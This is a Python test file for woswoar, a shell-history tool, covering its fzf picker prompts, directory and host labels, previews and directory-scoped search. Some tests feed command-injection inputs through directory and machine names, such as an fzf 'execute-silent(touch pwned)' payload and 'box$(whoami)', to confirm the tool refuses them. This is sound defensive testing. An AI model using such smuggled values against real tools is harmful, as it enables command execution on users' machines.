        (self.home / "src/session-manager").mkdir(parents=True)
        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
            for i, cmd in enumerate(["in-proj-one", "in-proj-two"]):
                entry = Entry(NOW + i, MACHINE_ID, "s1", "~/src/session-manager", 0, 1, cmd)
                handle.write(format_line(entry) + "\n")

    def picker_env(self) -> dict[str, str]:
        bin_dir = self.root / "bin"
        bin_dir.mkdir(exist_ok=True)
        shim = bin_dir / "woswoar"
        shim.write_text(f'#!/bin/sh\nexec {sys.executable} -m woswoar "$@"\n', encoding="utf-8")
        shim.chmod(0o755)
        return {
            "PATH": f"{bin_dir}:{os.environ.get('PATH', '/usr/bin:/bin')}",
            "TERM": "xterm",
            "HOME": str(self.home),
            "PWD": str(self.home / "src/session-manager"),
            "SHELL": "/bin/sh",
            "PYTHONPATH": str(Path(__file__).resolve().parent.parent),
            "WOSWOAR_DIR": os.environ["WOSWOAR_DIR"],
            "XDG_CONFIG_HOME": os.environ["XDG_CONFIG_HOME"],
            "XDG_CACHE_HOME": os.environ["XDG_CACHE_HOME"],
        }

    def test_the_prompt_shows_the_directory_and_still_cycles_out_of_dir(self) -> None:
        """Two presses, and the markers are the assertions.

        `~/src/proj` in the prompt can only have come from fzf painting it --
        the harness never types it. Then Ctrl-R once more: with the substring
        matcher this prompt read as `session` and went to `dir`, so arriving at
        `global` is what says the anchoring works through a real fzf and not
        only in a unit test.
        """
        cwd = os.getcwd()
        self.addCleanup(os.chdir, cwd)
        os.chdir(self.home / "src/session-manager")

        steps = [
            Typed("", "in-proj-one"),
            # Ctrl-O is the direct key for `dir`; the label is what it paints.
            Typed("\x0f", "woswoar (dir ~/src/session-manager)"),
            # And round: dir -> global, which is only reachable if the prompt
            # just painted was read back as `dir`.
            Typed("\x12", "woswoar (global)"),
        ]
        run_in_pty(
            [sys.executable, "-m", "woswoar", "search", "--scope", "global"],
            steps,
            env=self.picker_env(),
        )


@requires_fzf
class TestThePreviewUnderARealFzf(WoswoarTestCase):
    """The pane, driven through a real fzf under a real terminal.

    Every other test here asserts the strings woswoar hands fzf. This one
    asserts what fzf does with them, and there is one step of the design nothing
    else can reach: the `{n}` a `transform` prints for the preview has to
    survive fzf expanding the transform's own command line first. `man fzf`
    documents that a backslash escapes a placeholder; what becomes of that
    escape inside a transform's *output* is written down nowhere, and the whole
    timeline interaction rests on it.

    The markers are directories, which appear only in the pane -- never on a
    display line, and never in anything the harness types.
    """

    #: Chronological. The repeat is what makes the ranked list and the timeline
    #: window disagree about which command index 3 is, which is the only way a
    #: preview that ignored `--around` could be caught.
    HISTORY: ClassVar[list[str]] = ["first", "dup", "second", "dup", "third"]

    def setUp(self) -> None:
        super().setUp()
        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
            for i, cmd in enumerate(self.HISTORY):
                entry = Entry(NOW + i * 60, MACHINE_ID, "s1", f"~/d{i}", 0, 1234, cmd)
                handle.write(format_line(entry) + "\n")

    def picker_env(self) -> dict[str, str]:
        """A sandbox whose `woswoar` on PATH is *this* tree.

        Not optional: `_self_command` prefers whatever `woswoar` it finds, and
        on a machine with woswoar installed that is a released copy which may
        predate `--show` entirely. The test would then pass or fail on which
        version happens to be on the developer's PATH.
        """
        bin_dir = self.root / "bin"
        bin_dir.mkdir(exist_ok=True)
        shim = bin_dir / "woswoar"
        shim.write_text(
            f'#!/bin/sh\nexec {sys.executable} -m woswoar "$@"\n',
            encoding="utf-8",
        )
        shim.chmod(0o755)
        return {
            "PATH": f"{bin_dir}:{os.environ.get('PATH', '/usr/bin:/bin')}",
            "TERM": "xterm",
            "HOME": str(self.root),
            "SHELL": "/bin/sh",
            "PYTHONPATH": str(Path(__file__).resolve().parent.parent),
            "WOSWOAR_DIR": os.environ["WOSWOAR_DIR"],
            "XDG_CONFIG_HOME": os.environ["XDG_CONFIG_HOME"],
            "XDG_CACHE_HOME": os.environ["XDG_CACHE_HOME"],
        }

    def drive(self, steps: list[Typed]) -> list[str]:
        return run_in_pty([sys.executable, "-m", "woswoar", "search"], steps, env=self.picker_env())

    #: Ctrl-/ and Ctrl-N as a terminal sends them. Ctrl-N is fzf's own `down`,
    #: which under `--layout=reverse` is the next item in the list.
    TOGGLE = "\x1f"
    NEXT = "\x0e"

    #: **The `until` markers are the assertions here.** `_read_until` loops
    #: until its needle appears and returns the buffer it found it in, so
    #: `assertIn(marker, that_step)` is true by construction and tests nothing --
    #: the same shape as CLAUDE.md's "a marker asserted in a shell's stdout also
    #: appears in the harness's echo of the line that was typed". A step that
    #: does not see its marker stalls and raises, carrying every screen with it.
    #: What is left for an `assert` is only what a *stall* cannot say: that
    #: something is absent.
    def test_the_pane_is_dark_until_the_key_and_then_follows_the_cursor(self) -> None:
        """Reaching the last step proves the pane appeared on the key and then
        renumbered itself, which is what says `change-preview` was handed a live
        template rather than one row's answer frozen into it. The `assert` adds
        the one thing the steps cannot: that it was not already there."""
        before, _revealed, _moved = self.drive(
            [
                # A command on screen means fzf has drawn the list and is
                # reading keys; asserting the *absence* of the pane before that
                # would assert nothing at all.
                Typed("", "third"),
                Typed(self.TOGGLE, "~/d4"),
                Typed(self.NEXT, "~/d3"),
            ]
        )
        self.assertNotIn("~/d4", before, "the pane rendered before anyone asked for it")

    def test_a_timeline_repoints_the_pane_at_its_own_window(self) -> None:
        """Ctrl-T replaces the list with a window that keeps the repeats, so the
        fourth row of it is `dup` at `~/d1`, where the fourth row of the ranked
        list is `first` at `~/d0`.

        Both directions are needed and neither alone is enough. Waiting for
        `~/d1` fails on a pane that ignored `--around`, because it would be
        showing `~/d0`; but it would also be satisfied by a pane that rendered
        *both* at some point, so the absence of `~/d0` is asserted as well. That
        is the answer the ranked list would have given, and seeing it here is
        exactly the plausible-looking wrong block this feature can produce.
        """
        *_, moved = self.drive(
            [
                Typed("", "third"),
                Typed(self.TOGGLE, "~/d4"),
                # Down twice to `second`, which has history either side of it,
                # then Ctrl-T to unfold it.
                Typed(self.NEXT, "~/d3"),
                Typed(self.NEXT, "~/d2"),
                Typed("\x14", "~/d2"),
                Typed(self.NEXT, "~/d1"),
            ]
        )
        self.assertNotIn("~/d0", moved, "the pane answered from the ranked list, not the window")


@requires_fzf
class TestWhatFzfSubstitutesWhenNoRowIsCurrent(WoswoarTestCase):
    """The premise `_timeline_binding`'s guard rests on, measured rather than assumed.

    `man fzf` documents `{n}` as the index of the current item and says nothing
    about a list that has no current item -- and the answer decides whether a
    guard is needed at all. It is: fzf runs the transform anyway and replaces
    the placeholder with *nothing*, so `--around {n}` became `--around` with the
    value missing and the reload died on it. Reported from a real picker as
    Ctrl-R followed quickly by Ctrl-T, where the first key's reload had not
    landed and the list was momentarily empty.

    This asserts fzf's behaviour, not woswoar's, and that is the point: the day
    it answers `-1` or declines to run the transform, the guard's shape is wrong
    and nothing else here would say so. `tests.test_search.TestTheTimelineAroundACommand`
    holds what woswoar does with the answer.

    A bare fzf rather than the picker, because what is under test is one
    substitution and the picker would put its own list, prompt and scope
    machinery between the question and the answer.
    """

    def test_an_absent_current_item_makes_the_index_empty(self) -> None:
        recorded = self.root / "index"
        # Two files rather than one long `--bind`: quoting a shell snippet
        # through fzf's binding parser *and* an f-string is how a test comes to
        # measure its own escaping.
        recorder = self.root / "recorder.sh"
        recorder.write_text(
            f'#!/bin/sh\nprintf "[%s]" "$1" > {recorded}\nprintf "change-prompt(done )"\n',
            encoding="utf-8",
        )
        recorder.chmod(0o755)

        run_in_pty(
            [
                "sh",
                "-c",
                "printf 'alpha\\nbeta\\n' | fzf --height=10 --layout=reverse --prompt='p> ' "
                f"--bind='ctrl-t:transform:{recorder} \"{{n}}\"'",
            ],
            [
                Typed("", "p>"),
                # A query nothing matches, which is the state without the race.
                Typed("zzzz", "0/2"),
                Typed("\x14", "done"),
                Typed("\x1b", ""),
            ],
            env={"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "TERM": "xterm"},
        )
        self.assertEqual(recorded.read_text(encoding="utf-8"), "[]")


class DirScopeCase(WoswoarTestCase):
    """A way to stand somewhere in the sandbox home.

    Shared because getting the fixture right is most of what testing `dir`
    costs: `os.chdir` does not touch `$PWD` -- it is the *shell* that maintains
    that. A test that only chdir'd would exercise the `getcwd` fallback while
    believing it exercised the `$PWD` path.
    """

    def setUp(self) -> None:
        super().setUp()
        self.addCleanup(os.chdir, os.getcwd())
        self.ts = NOW

    def set_env(self, key: str, value: str) -> None:
        """Set one variable for the length of this test, restoring what was."""
        patcher = mock.patch.dict(os.environ, {key: value})
        patcher.start()
        self.addCleanup(patcher.stop)

    def stand_in(self, path: Path | str) -> None:
        """Move there and set `$PWD` to the same string, the way a shell does."""
        os.chdir(path)
        self.set_env("PWD", str(path))

    def record(self, cwd: str, cmd: str, host: str = MACHINE_ID) -> None:
        """One command, recorded as having been run in `cwd`."""
        self.ts += 1
        with store.private_append(store.log_file(host, "2026-07-29")) as handle:
            handle.write(format_line(Entry(self.ts, host, "s", cwd, 0, 0, cmd)) + "\n")

    @staticmethod
    def commands(scope: search.Scope = "dir") -> list[str]:
        return sorted(recalled(scope))


class TestTheMachineInThePrompt(WoswoarTestCase):
    """`host` narrows to this machine, and nothing on screen said which one.

    Below two machines `host_width_for` draws no machine column at all, so in
    that scope the prompt was the only place the answer could go -- and being
    ssh'd somewhere is exactly when Ctrl-H gets pressed. Asked for right after
    `dir` gained its label: "the other search scopes show nothing, e.g. host
    could show the current host".
    """

    def name_this_machine(self, name: str) -> None:
        """Give this machine a display name, the way `save_machine` does."""
        store.save_machine(store.machine()._replace(name=name))

    def test_it_names_this_machine(self) -> None:
        self.name_this_machine("martinus@thinkpad")
        self.assertEqual(search._prompt_for("host"), "woswoar (host thinkpad) ")

    def test_it_shows_the_half_the_machine_column_would_show(self) -> None:
        """`user@host` on one person's machines differs in the host, which is
        why the column tries that half first. The prompt and the column must not
        disagree about the same machine.
        """
        self.name_this_machine("martinus@thinkpad")
        machine_id = store.machine().id
        self.assertEqual(
            search._prompt_for("host"),
            f"woswoar (host {search.host_labels({machine_id})[machine_id]}) ",
        )

    def test_a_machine_with_no_name_yet_is_not_named_by_its_id(self) -> None:
        """`host_label` falls back to eight hex characters, which is right for a
        column that has to say *something* per row and answers nothing here."""
        machine_id = store.machine().id
        (store.host_dir(machine_id) / ".name").unlink(missing_ok=True)
        self.assertEqual(search._prompt_for("host"), "woswoar (host) ")

    def test_building_the_prompt_does_not_mint_an_identity(self) -> None:
        """`store.machine()` *generates* one when the file is absent. Building a
        label is not a reason to write a machine id to disk -- and the four
        direct keys are built whatever scope the picker opens in, so this would
        run for someone who never presses Ctrl-H.
        """
        store.machine_file().unlink(missing_ok=True)
        self.assertEqual(search._prompt_for("host"), "woswoar (host) ")
        self.assertFalse(store.machine_file().exists(), "asking for a prompt created an identity")

    def test_a_machine_name_the_parsers_would_read_is_not_shown(self) -> None:
        """The name is a person's to choose and reaches the same two parsers the
        directory does -- `woswoar rename` writes whatever it is given."""
        self.name_this_machine("box$(whoami)")
        self.assertEqual(search._prompt_for("host"), "woswoar (host) ")

    def test_the_cycle_repaints_it_too(self) -> None:
        """Through a real `sh`: landing on `host` by cycling and by Ctrl-H must
        leave the same string, or the next press reads a different scope."""
        self.name_this_machine("martinus@thinkpad")
        binding = search._cycle_binding("woswoar", "", " --host-width 0")
        out = run_binding(binding, "transform:", "woswoar (global) ")
        painted = out.split("change-prompt(", 1)[1].split(")+change-preview", 1)[0]
        self.assertEqual(painted, search._prompt_for("host"))

    def test_the_prompt_it_paints_is_still_read_back_as_host(self) -> None:
        """A machine name is user text in the string the scope is kept in --
        the same hazard the directory label had, and `~/src/session-manager` is
        the shape that used to misroute it."""
        self.name_this_machine("session-manager")
        binding = search._cycle_binding("woswoar", "", " --host-width 0")
        out = run_binding(binding, "transform:", search._prompt_for("host"))
        self.assertIn(f"--scope {search._NEXT['host']})", out)


class TestTheDirectoryInThePrompt(DirScopeCase):
    """`woswoar (dir)` said which scope you were in and not which directory.

    Asked for directly: "is it possible to show the actual directory instead of
    `dir`?" It was not, quite: the prompt is where fzf keeps the scope, the arms
    that read it back were substring matches, and a path is user text. Anchoring
    them is what made it possible, and this class is the other half -- what the
    label may say, and what it declines to say.
    """

    def test_it_names_the_directory_you_are_standing_in(self) -> None:
        self.stand_in(self.home)
        self.assertEqual(search._prompt_for("dir"), "woswoar (dir ~) ")

        (self.home / "src/woswoar").mkdir(parents=True)
        self.stand_in(self.home / "src/woswoar")
        self.assertEqual(search._prompt_for("dir"), "woswoar (dir ~/src/woswoar) ")

    def test_global_and_session_gain_nothing(self) -> None:
        """A decision, not an omission.

        `global` is every machine, which is what the word says -- a count of
        them describes the history rather than the scope, and moves under
        someone as they sync. `session` is the shell being typed into, and its
        id is `<second>-<pid>` in hex, which nobody recognises.

        `host` is deliberately absent from this list; it has its own class.
        """
        self.stand_in(self.home)
        for scope in ("global", "session"):
            with self.subTest(scope=scope):
                self.assertEqual(search._prompt_for(scope), f"woswoar ({scope}) ")

    def test_a_long_path_is_cut_from_the_left(self) -> None:
        """The prompt and the query share a line, and the tail is the part that
        identifies a directory -- `~/src/very/deep/...` says nothing that
        `.../deep/thing` does not say better."""
        deep = self.home / "one/two/three/four/five/six/seven/eight"
        deep.mkdir(parents=True)
        self.stand_in(deep)

        prompt = search._prompt_for("dir")
        self.assertLessEqual(len(prompt), len("woswoar (dir ) ") + search._PROMPT_LABEL_MAX)
        # `_ELLIPSIS`, the same one-column character `_clip` uses on the machine
        # column -- three dots would spend two more of the columns this constant
        # exists to save.
        self.assertIn(search._ELLIPSIS, prompt)
        self.assertIn("eight", prompt, "the end of the path is what it had to keep")

    def test_a_path_either_parser_would_read_is_not_shown_at_all(self) -> None:
        """The label crosses two languages, and the guard has to survive both.

        fzf parses `change-prompt(...)` out of an action string, so `)` ends the
        argument and `+` starts the next action. The cycle key repaints from
        inside a `printf "..."` that fzf hands to the shell, so `"`, `$`, a
        backtick and a backslash are the shell's -- and `%` is printf's, which
        an earlier denylist here missed: it renamed `~/50%-off` to `~/500ff`
        silently, and truncated the action string outright for a name ending in
        `%`.

        Driven per character, because one example passes against a guard that
        happens to catch that one -- which is how the four-character denylist
        this replaced looked correct.
        """
        for hostile in ('"', "$", "`", "\\", "%", ")", "(", "+", ";", "&", "'", "*"):
            with self.subTest(char=hostile):
                awkward = self.home / f"a{hostile}b"
                awkward.mkdir()
                self.stand_in(awkward)
                self.assertEqual(search._prompt_for("dir"), "woswoar (dir) ")

    def test_an_ordinary_path_in_any_script_is_shown(self) -> None:
        """Otherwise the guard above passes by rejecting everything.

        Letters and digits are asked of `str.isalnum`, not of ASCII: a home
        directory is a person's name as often as not.
        """
        for name in ("src/proj", "üni-cödé", "日本語", "a_b.c-d", "v1.2"):
            with self.subTest(name=name):
                ordinary = self.home / name
                ordinary.mkdir(parents=True)
                self.stand_in(ordinary)
                self.assertEqual(search._prompt_for("dir"), f"woswoar (dir ~/{name}) ")

    def test_a_directory_that_could_smuggle_an_fzf_action_is_refused(self) -> None:
        """The one that is not a display bug.

        `change-prompt(<label>)` is parsed by fzf, and `+` separates actions --
        so a directory whose name closes the paren and opens `execute-silent`
        is a command fzf would run when the prompt is repainted. Nothing but
        the width cap stood between that and a shell, and a width cap is a
        taste constant.
        """
        payload = "x)+execute-silent(touch pwned)+change-prompt(z"
        smuggler = self.home / payload
        smuggler.mkdir()
        self.stand_in(smuggler)
        self.assertEqual(search._prompt_for("dir"), "woswoar (dir) ")
        self.assertNotIn("execute-silent", search._cycle_binding("woswoar", "", " --host-width 0"))

    def test_the_cycle_repaints_the_same_prompt_the_direct_key_paints(self) -> None:
        """Landing on `dir` two ways must leave the same string on screen, or
        the next keypress reads a different scope from each.

        Through a real `sh`, not by matching the emitted source. This assertion
        used to be two `assertIn`s over the generated script -- a mirror of the
        f-string that produced it, which cannot see what the shell then does
        with it. `%` is what it could not see: `$p` is expanded into *printf's
        format*, so `~/src/100%done` was repainted as `~/src/1000one` while the
        direct key painted it correctly.
        """
        (self.home / "src/proj").mkdir(parents=True)
        self.stand_in(self.home / "src/proj")

        binding = search._cycle_binding("woswoar", "", " --host-width 0")
        out = run_binding(binding, "transform:", "woswoar (session) ")
        painted = out.split("change-prompt(", 1)[1].split(")+change-preview", 1)[0]
        self.assertEqual(painted, search._prompt_for("dir"))

    def test_a_directory_that_is_gone_is_not_named_in_prose(self) -> None:
        """`_here_label` answers "this directory" when there is nothing to name,
        which is right for a sentence and wrong for a slot that means a path --
        `woswoar (dir this directory)` reads as a directory called that."""
        gone = self.home / "gone"
        gone.mkdir()
        self.stand_in(gone)
        gone.rmdir()
        self.set_env("PWD", "")
        self.assertEqual(search._prompt_for("dir"), "woswoar (dir) ")

    def test_the_label_it_shows_is_the_one_the_empty_note_names(self) -> None:
        """Two sentences about the same directory, and they were written apart:
        "no commands recorded in X or below" and the prompt. A person who sees
        both must not be told two different things."""
        (self.home / "src/proj").mkdir(parents=True)
        self.stand_in(self.home / "src/proj")
        note = search.empty_note("dir")
        assert note is not None
        self.assertIn("~/src/proj", note)
        self.assertIn("~/src/proj", search._prompt_for("dir"))


class TestTheDirectoryScope(DirScopeCase):
    """`dir`: this directory and everything below it, on every machine.

    Every record has carried a `cwd` since the format existed -- written by the
    hook, escaped, encrypted, synced and parsed into the cache -- and until now
    `search` never read it. So the scope costs no new storage and no migration;
    what it costs is getting the comparison right, and there are four ways to
    get it wrong that all look like a working feature.
    """

    OTHER = "ffffffffffffffff"

    def test_it_keeps_this_directory_and_below(self) -> None:
        """The sibling in the fixture is the point of the fixture: with only a
        parent and a child recorded, a filter that kept everything would give
        the same answer as one that worked."""
        (self.home / "src/proj").mkdir(parents=True)
        self.record("~/src/proj", "in the project")
        self.record("~/src/proj/sub", "in a subdirectory")
        self.record("~/src/other", "in a sibling")

        self.stand_in(self.home / "src/proj")
        self.assertEqual(self.commands(), ["in a subdirectory", "in the project"])

    def test_a_sibling_that_starts_the_same_is_not_a_child(self) -> None:
        """`~/src/foobar` starts with `~/src/foo` and is not underneath it. The
        same trap `entry.home_relative` is anchored against, one directory
        further down, and a bare `startswith` walks into both."""
        (self.home / "src/foo").mkdir(parents=True)
        self.record("~/src/foo", "in foo")
        self.record("~/src/foobar", "in foobar")

        self.stand_in(self.home / "src/foo")
        self.assertEqual(self.commands(), ["in foo"])

    def test_a_symlinked_directory_matches_what_the_hook_recorded(self) -> None:
        """The hook records `$PWD`, which after a `cd` through a symlink is the
        path you typed and not the one it resolves to. Looking the other one up
        makes every command run in a symlinked directory invisible here.

        The resolved path is a different key, and stays one: that is what was
        recorded for commands actually typed there, and guessing that the two
        are the same directory is a resolution this does not do.
        """
        real = self.home / "elsewhere/project"
        real.mkdir(parents=True)
        (self.home / "proj").symlink_to(real)
        self.record("~/proj", "typed through the link")
        self.record("~/elsewhere/project", "typed at the real path")

        self.stand_in(self.home / "proj")
        self.assertEqual(self.commands(), ["typed through the link"])

    def test_a_pwd_that_is_not_this_directory_is_not_believed(self) -> None:
        """`$PWD` is inherited, so it is whatever the parent process left there.
        Believed only when `stat` agrees it is the directory we are in."""
        (self.home / "here").mkdir()
        (self.home / "there").mkdir()
        self.record("~/here", "recorded where we stand")
        self.record("~/there", "recorded somewhere else")
        os.chdir(self.home / "here")

        for stale in (str(self.home / "there"), "."):
            with self.subTest(pwd=stale):
                self.set_env("PWD", stale)
                self.assertEqual(self.commands(), ["recorded where we stand"])

    def test_it_spans_machines(self) -> None:
        """`~/src/proj` on either of your boxes is the same project, and asking
        that across machines is the question woswoar exists for. The scopes do
        not compose, so a `dir` that also meant `host` would remove it."""
        (self.home / "src/proj").mkdir(parents=True)
        self.record("~/src/proj", "mine")
        self.record("~/src/proj", "theirs", host=self.OTHER)

        self.stand_in(self.home / "src/proj")
        self.assertEqual(self.commands(), ["mine", "theirs"])

    def test_a_peer_path_stored_absolute_is_matched_too(self) -> None:
        """`importer` rewrites a path to `~` only for this machine's own rows --
        another machine's home is a guess -- so an atuin import of two hosts
        stores the same directory both ways. One key silently misses half of it,
        in exactly the multi-machine case this scope is for."""
        (self.home / "src/proj").mkdir(parents=True)
        self.record("~/src/proj", "mine, stored with a tilde")
        self.record(str(self.home / "src/proj"), "theirs, stored absolute", host=self.OTHER)

        self.stand_in(self.home / "src/proj")
        self.assertEqual(self.commands(), ["mine, stored with a tilde", "theirs, stored absolute"])

    def test_the_root_directory_matches_everything(self) -> None:
        """Every recorded directory is under `/`, including the `~` ones -- which
        do not start with `/` at all, so the anchored prefix test matches none of
        them and would build `//` besides."""
        self.record("~/src", "under home")
        self.record("/etc", "outside home")

        self.stand_in("/")
        self.assertEqual(self.commands(), ["outside home", "under home"])

    def test_a_control_byte_in_the_directory_name_still_matches(self) -> None:
        """The cache holds the `cwd` that `parse_line(..., inert=True)` produced,
        so the byte is already gone from what is stored. A key still carrying it
        matches nothing, and the directory quietly has no history."""
        odd = self.home / "we\x01ird"
        odd.mkdir()
        self.record("~/we\x01ird", "in the odd directory")

        self.stand_in(odd)
        self.assertEqual(self.commands(), ["in the odd directory"])

    def test_nothing_recorded_here_is_empty_rather_than_everything(self) -> None:
        """The failure that looks most like success: a scope that matches
        nothing has to return nothing, not fall back to the whole history."""
        (self.home / "empty").mkdir()
        self.record("~/src", "somewhere else entirely")

        self.stand_in(self.home / "empty")
        self.assertEqual(self.commands(), [])

    def test_a_directory_deleted_under_us_still_answers(self) -> None:
        """`rm -rf` of the directory you are standing in, then Ctrl-R. There is
        no `.` left to check `$PWD` against and nothing for `os.getcwd` to
        resolve, so `$PWD` is all that is left of where you are -- and a
        traceback here would be a worse answer than the history it still knows."""
        doomed = self.home / "doomed"
        doomed.mkdir()
        self.record("~/doomed", "run before it went")

        self.stand_in(doomed)
        doomed.rmdir()
        self.assertEqual(self.commands(), ["run before it went"])

    def test_a_directory_that_cannot_be_named_at_all_is_not_a_crash(self) -> None:
        """The same deletion with no `$PWD` to fall back on -- which is a shell
        that never exported one, or `env -i`. Nothing can be matched, and the
        note that would otherwise name the directory has nothing to name."""
        doomed = self.home / "doomed"
        doomed.mkdir()
        self.record("~/doomed", "run before it went")

        os.chdir(doomed)
        self.set_env("PWD", "")
        doomed.rmdir()
        self.assertEqual(self.commands(), [])
        self.assertEqual(
            search.empty_note("dir"),
            "woswoar: no commands recorded in this directory or below",
        )


class TestAnEmptyDirScopeSaysWhereItLooked(DirScopeCase):
    """An empty `global` explains itself; an empty `dir` looks like a bug.

    And the one fact that tells those apart is *which* directory was searched --
    which is exactly what the `$PWD` rule in `search._here` can get wrong. So it
    is named, once, to a person.
    """

    def setUp(self) -> None:
        super().setUp()
        self.stand_in(self.home)

    def test_a_terminal_is_told_which_directory_was_searched(self) -> None:
        ran = run_cli("list", "--scope", "dir", tty=True)
        self.assertEqual(ran.out, "")
        self.assertIn("no commands recorded in ~ or below", ran.err)

    def test_a_pipe_stays_clean(self) -> None:
        """`woswoar list --scope dir | wc -l` has to keep counting lines."""
        ran = run_cli("list", "--scope", "dir")
        self.assertEqual((ran.out, ran.err), ("", ""))

    def test_the_pickers_reload_is_not_written_into(self) -> None:
        """fzf reads the reload's stdout through a pipe while leaving its stderr
        on the terminal, so a note gated on *stderr* being a tty would land in
        the middle of the picker. The gate is on stdout, and only these two
        streams disagreeing can tell the difference."""
        out, err = Captured(tty=False), Captured(tty=True)
        with redirect_stdout(out), redirect_stderr(err):
            main(["list", "--scope", "dir"])
        self.assertEqual(err.getvalue(), "", "the picker's screen was written into")

    def test_a_scope_that_found_something_says_nothing(self) -> None:
        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
            handle.write(format_line(Entry(NOW, MACHINE_ID, "s", "~", 0, 0, "here")) + "\n")
        ran = run_cli("list", "--scope", "dir", tty=True)
        self.assertIn("here", ran.out)
        self.assertEqual(ran.err, "")

    def test_the_other_scopes_stay_quiet_when_empty(self) -> None:
        """An empty `global` is a machine that has recorded nothing, which needs
        no explaining -- and `list` is a pipe target before it is a report."""
        for scope in ("global", "host", "session"):
            with self.subTest(scope=scope):
                self.assertEqual(run_cli("list", "--scope", scope, tty=True).err, "")
